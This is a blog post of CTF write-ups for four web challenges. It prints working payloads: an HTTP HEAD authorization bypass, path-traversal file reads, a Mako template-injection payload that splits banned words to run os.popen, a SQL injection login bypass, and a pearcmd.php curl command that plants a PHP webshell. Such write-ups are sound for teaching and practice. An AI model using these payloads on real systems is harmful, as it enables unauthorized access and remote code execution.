---
layout: single
title: "CAT CTF 26: Entry Level WEB Write-ups"
date: 2026-03-23
categories: [web]
tags: [CTF, Cybersecurity]
author_profile: true
---

🏆 CAT CTF 26: Entry Level WEB Write-ups
========================================

What’s up, hackers! 👋

![Meme](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/meme.jpg)

it’s time to dive into my primary category: **Web Exploitation**. 🕸️

As a solo player, the Web category was a massive battlefield. Out of the 10 challenges available, I managed to clear **6 of them**. Even with the intense competition, I secured **Second Blood 🥈** on one challenge and **Third Blood 🥉** on another.  

![webchallenges](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/webchallenges.png)

Web challenges are all about understanding how a developer thinks—and then finding where they got a bit too comfortable.

Let’s kick off the Web series with a challenge that was literally a "headache"—until I realized the answer was right in front of me.

===

🕸️ Web Series: Headache
========================

**Author:** 0xdblm  
**Points:** 100

![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/challenge.png)

---

📝 The Challenge Description
----------------------------

> "Headache"

>  **URL:** `http://167.99.34.2:5000/`

Upon visiting the home page, I was greeted with an "Internal Gateway" message:

*   **Status:** Request rejected.
    
*   **Hint:** "Try again with less body."
    
*   **Options:**  Get Flag  |  Admin Portal.

![firstpage](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/firstpage.png)
    
* * *

🔍 Phase 1: Initial Discovery
-----------------------------

When I clicked on the **"Get Flag"** button, it redirected me to `/api/flag`. Instead of the flag, I received a cold JSON response:

![getflag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/getflag.png)

🧪 Phase 2: Analyzing the API (Burp Suite)
------------------------------------------

I intercepted the request to `/api/flag` using **Burp Suite** to see exactly what was happening under the hood.

**The Request:**

    GET /api/flag HTTP/1.1
    Host: 167.99.34.2:5000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
    Referer: http://167.99.34.2:5000/
    Connection: keep-alive 

**The Response:**

HTTP

    HTTP/1.1 403 FORBIDDEN
    Server: Werkzeug/2.3.0 Python/3.11.15
    Content-Type: application/json
    Content-Length: 75
    
    {"error":"admin_only","message":"Missing elevated authorization context."}

![getmethod](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/getmethod.png)

The server was running **Werkzeug**, a common WSGI web application library for Python. The `403 Forbidden` status confirmed that the standard `GET` request was being blocked by an authorization check.

---

💡 Phase 3: The Exploit (Using your HEAD)
-----------------------------------------

I went back to the hint on the homepage: **"Try again with less body."**

In HTTP, a `GET` request can have a body, but a **HEAD** request is identical to a `GET` request except that the server **must not** return a message-body in the response. It only returns the headers.

If the developer implemented the "Admin Only" check only for `GET` and `POST` methods, a `HEAD` request might bypass the security filter entirely.

**The Attack:** I changed the request method from `GET` to `HEAD` in Burp Repeater.

HTTP

    HEAD /api/flag HTTP/1.1
    Host: 167.99.34.2:5000
    ... 

**The Response:**

HTTP

    HTTP/1.1 200 OK
    Server: Werkzeug/2.3.0 Python/3.11.15
    Date: Tue, 24 Mar 2026 03:14:35 GMT
    Content-Type: application/json
    X-Flag: CATF{M4Yb3_Us1ng_y0ur_H34D_1S_us3full}
    Cache-Control: no-store
    Content-Length: 0
    Connection: close

![headmethod](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Web/Headache/headmethod.png)

Success! By switching to the `HEAD` method, the server bypassed the authorization logic and served the flag directly in a custom HTTP header: **`X-Flag`**.

* * *

🏁 The Flag
-----------

The pun in the flag confirmed the intended solution:

**Final Flag:** `CATF{M4Yb3_Us1ng_y0ur_H34D_1S_us3full}`

* * *

==========================================================

🕸️ Web Series: Admin Jokes
===========================

Welcome to the second web challenge in this series. This one required chaining a few classic web vulnerabilities together: starting with an LFI (Local File Inclusion) to leak the source code, discovering a hidden endpoint, and ultimately exploiting an SSTI (Server-Side Template Injection) while bypassing a security filter to get an RCE (Remote Code Execution).

**Author:** 0xdblm

**Points:** 100

![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/challenge.png)

📝 The Challenge Description
----------------------------

> "Admin is a wise man; he doesn't say silly jokes."

> **URL:** `http://167.99.34.2:5008/`

Upon entering the site, I found a simple homepage for an "Admin Jokes Portal."

![home](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/hone.png)

It had a link pointing to: `http://167.99.34.2:5008/jokes?joke=1` Visiting this link displayed a basic joke about internal server errors.

![firstpage](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/firstpage.png)

🔍 Phase 1: LFI & Directory Traversal
-------------------------------------

My first instinct was to test the joke parameter for IDOR (Insecure Direct Object Reference) by changing the number. I manually enumerated the values and found that valid jokes existed from joke=1 up to joke=6. However, when I hit ?joke=7 (and anything above it), the server returned a "Not Found" error.

Next, I tested for **Path Traversal / LFI** by inserting a classic payload: `http://167.99.34.2:5008/jokes?joke=../../../../../../../../../../../`

**The Result:** Boom! The application listed the entire root directory of the Linux filesystem.

![pathtraversal](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/pathtraversal.png)

The listing showed some interesting files and directories: `.dockerenv`, `app`, `etc`, `flag.txt`, `readflagbinary`, `root`, `tmp`, etc.

I immediately tried to read the flag: `?joke=../../../../../../../../../../../flag.txt`

But the author was trolling:

> _"CATF{Fake\_Flag\_Try\_Harder\_Buddy} hahahaha nice try! Hint: You need an RCE.... and look somewhere for the real flag."_

![fakeflag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/fakeflag.png)

The most interesting file was `/readflagbinary`. However, trying to read it via the browser resulted in an Internal Server Error because it's an executable binary, not a text file. I needed an RCE to execute it.

* * *

🧩 Phase 2: Source Code Review via `/proc/self/cwd`
---------------------------------------------------

To get an RCE, I needed to understand how the backend worked. Since I had LFI, I used a well-known Linux trick to read the source code of the running application.

By navigating to `/proc/self/cwd/`, which points to the Current Working Directory of the running process, I could read the main Python file: 
`http://167.99.34.2:5008/jokes?joke=../../../../../../../../../../../proc/self/cwd/app.py`

![burprequest](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/burprequest.png)

I extracted the source code. Here is the most critical part of the application logic:

Python

    from mako.template import Template
    import os
    
    BLACKLIST = ["os", "system", "eval", "popen", "subprocess"]
    
    # ... (other routes) ...
    
    @app.route("/admin/profile")
    def admin_profile():
        name = request.args.get("name", "Admin")
        lowered = name.lower()
        
        if any(token in lowered for token in BLACKLIST):
            return "Blocked by security filter.", 403
    
        template = Template(f"<h2>Admin Profile</h2><p>Welcome, {name}</p>")
        return template.render() 

* * *

💻 Phase 3: Exploiting SSTI (Server-Side Template Injection)
------------------------------------------------------------

From the source code, two things were immediately obvious:

1.  **The Template Engine:** The app uses `mako.template.Template`.
    
2.  **The Vulnerability:** The `name` parameter in the `/admin/profile` route is directly concatenated into the template string `Template(f"...{name}...")` before rendering. This is a classic **SSTI** vulnerability.
    

### 1\. Proof of Concept (PoC)

I navigated to the hidden endpoint and tested a basic Mako SSTI payload: `GET admin/profile?name=${7*7}`

**The Response:**

HTTP

    HTTP/1.1 200 OK
    Admin Profile 
    Welcome, 49

![49](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/49.png)

The math executed! The SSTI was confirmed.

### 2\. Bypassing the Blacklist for RCE

To read the flag, I needed to execute the `/readflagbinary` file. However, the developer implemented a blacklist: `BLACKLIST = ["os", "system", "eval", "popen", "subprocess"]`

I couldn't just use standard Python OS commands because the `name.lower()` check would block them.

**The Bypass:** I crafted a payload using string concatenation inside the template execution block. By breaking the banned words into smaller strings and adding them together, I bypassed the filter.

`'o'+'s'` avoids the `"os"` filter. `'po'+'pen'` avoids the `"popen"` filter.

**The Final Payload:** `${__import__('o'+'s').__dict__['po'+'pen']('/readflagbinary').read()}`

* * *

🏁 Phase 4: Getting the Flag
----------------------------

I sent the final crafted payload via Burp Suite to execute the binary:

**Request:**

    GET admin/profile?name=${__import__('o'+'s').__dict__['po'+'pen']('/readflagbinary').read()} HTTP/1.1
    Host: 167.99.34.2:5008
    Connection: keep-alive 

**Response:**

    HTTP/1.1 200 OK
    Server: Werkzeug/3.1.6 Python/3.12.13
    Date: Tue, 24 Mar 2026 17:10:11 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 87
    Connection: close
    
    <h2>Admin Profile</h2><p>Welcome, CATF{Mak0_LF1_2_SSTI_Adm1n_J0k3s_Pwn3d_9f4e2b7c}</p>

![flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/Adminjokes/flag.png)

**Final Flag:** `CATF{Mak0_LF1_2_SSTI_Adm1n_J0k3s_Pwn3d_9f4e2b7c}`

==================================================================

🕸️ Web Series: Easy Injection
==============================

Moving on to the next Web challenge! As the name implies, "Easy Injection" was a straightforward challenge, This challenge was all about understanding the logic of authentication flows and exploiting improper input sanitization.

**Author:** 0xdblm

**Points:** 100

![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/challenge.png)

📝 The Challenge Description
----------------------------

> **URL:** `http://167.99.34.2:5777`

The homepage presented a standard portal with options to Register and Login. Standard users can create accounts, but administrative tools are restricted to staff members with elevated access.

![homepage](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/homepage.png)

🔍 Phase 1: Recon & Standard Access
-----------------------------------

My first step was to play by the rules to see what a normal user can access. I went to the **Register** page and created a standard account with my signature credentials:

*   **Username:** `0xaskar`
    
*   **Password:** `0xaskar`

![create](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/create.png)  

After logging in, I was redirected to the user Dashboard. The dashboard confirmed my standard access and clearly stated:

> **Account Status** User workspace access: active Administrative tools: **restricted**

![0xaskar](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/0xaskar.png)  

There was a link pointing to a separate **"Administrative Login"** screen. That was my actual target.

* * *

💻 Phase 2: The Admin Portal & SQLi
-----------------------------------

I navigated to the Administrative Login page. It was a restricted area asking for an Admin Username and Password. The placeholder for the username explicitly hinted at `admin`.

**The Vulnerability:** Whenever I see a custom login form, my first instinct is to test for **SQL Injection (SQLi)**. If the backend doesn't sanitize the inputs and directly concatenates them into a SQL query, we can manipulate the logic to bypass the password check entirely.

A typical backend query looks something like this:

SQL

    SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'; 

* * *

💣 Phase 3: The Exploit (Auth Bypass)
-------------------------------------

I decided to use a classic SQLi payload in the **Admin Username** field to comment out the rest of the query (specifically, the password verification part).

**The Payload:**

*   **Admin Username:** `admin' --`
    
*   **Admin Password:** `0xaskar` _(or literally any random string)_

![payload](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/payload.png)    

**Why it works:** By injecting `admin' --`, the backend query transforms into:

SQL

    SELECT * FROM users WHERE username = 'admin' --' AND password = '0xaskar'; 

The `--` turns the rest of the line into a comment in SQL. The database only executes `SELECT * FROM users WHERE username = 'admin'`, logs me in as the admin, and completely ignores whatever password I typed!

* * *

🏁 Phase 4: Getting the Flag
----------------------------

The exploit worked flawlessly. The authentication was bypassed, and I was granted access to the **Administration Panel**.

![flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/flag.png)    

**Final Flag:** `CATF{E4SY_e4sy_Easy_1nj3c410n}`

* * *

# 🕸️ Web Series: I love PHP

This challenge was a real treat for PHP lovers (and haters). The title says it all, and the description gave a huge hint: "PHP is a weird way to spell RCE." It started as a simple file inclusion and turned into a full Remote Code Execution (RCE) using a clever trick with the PHP PEAR management tool.

**Author:** marco  

**Points:** 244 

![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/challenge.png)

---

## 📝 The Challenge Description
> "PHP is a weird way to spell RCE"

> **URL:** `http://167.99.34.2:8888/`

Upon visiting the homepage, the source code was displayed directly:

`<?php 
$file = $_GET['file'] ?? null; 
if ($file) { 
    if (strpos($file, 'file://') === 0) { 
        include($file); 
    } 
} else { 
    highlight_file(__FILE__); 
}`

![code](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/code.png)

🔍 Phase 1: Initial Discovery & Failed Attempts
-----------------------------------------------

The code has a clear **Local File Inclusion (LFI)** vulnerability via the `include($file)` function. However, the path **must** start with `file://`.

### My Failed Attempts:

1.  **PHP Filters:** I tried `file://php://filter/...` to read files, but it failed because PHP interpreted it as a literal local path rather than a wrapper.
    
2.  **Log Poisoning:** I attempted to reach standard log paths (Nginx/Apache), but they were inaccessible or didn't exist.
    
* * *

💡 Phase 2: The Exploit (Pearcmd.php RCE)
-----------------------------------------

Remembering the "RCE" hint, I focused on a powerful technique: exploiting **`pearcmd.php`**.

In many PHP Docker environments, PEAR is installed at `/usr/local/lib/php/pearcmd.php`. If `register_argc_argv` is enabled, we can pass command-line arguments via the URL.

### The Attack Plan:

Use the `config-create` command in PEAR to write a custom PHP WebShell into the `/tmp/` directory.

### The "Golden" Payload:

I used **`curl`** with the `-g` (globoff) flag to ensure the brackets and PHP tags were sent exactly as written.

**Command:**

    curl -g -v "[http://167.99.34.2:8888/?+config-create+/&file=file:///usr/local/lib/php/pearcmd.php&/](http://167.99.34.2:8888/?+config-create+/&file=file:///usr/local/lib/php/pearcmd.php&/)+/tmp/0xaskar.php" 

![curl](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/curl.png)

The server responded with: `Successfully created default configuration file "/tmp/0xaskar.php"`

* * *

🏁 Phase 3: Command Execution & Flag
------------------------------------

Now that my shell `/tmp/0xaskar.php` was created, I used the original LFI vulnerability to execute it.

### 1\. Listing Directory Contents

By navigating to: `http://167.99.34.2:8888/?file=file:///tmp/0xaskar.php&1=ls -la /`

![php](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/php.png)

The output showed the raw PEAR configuration file, but hidden inside the strings was the output of my `ls` command! I found an interesting SUID binary:

    -rwsr-xr-x 1 root root 14336 Mar 21 22:50 readflag 

![readflag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/readflag.png)

### 2\. The Final Blow

I executed the binary to read the flag: `http://167.99.34.2:8888/?file=file:///tmp/0xaskar.php&1=/readflag`

The flag appeared multiple times within the PEAR configuration output:

![flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/flag.png)

**Response Snippet:**

> `.../&file=file:/usr/local/lib/php/pearcmd.php&/CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}...`

**Final Flag:** `CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}`
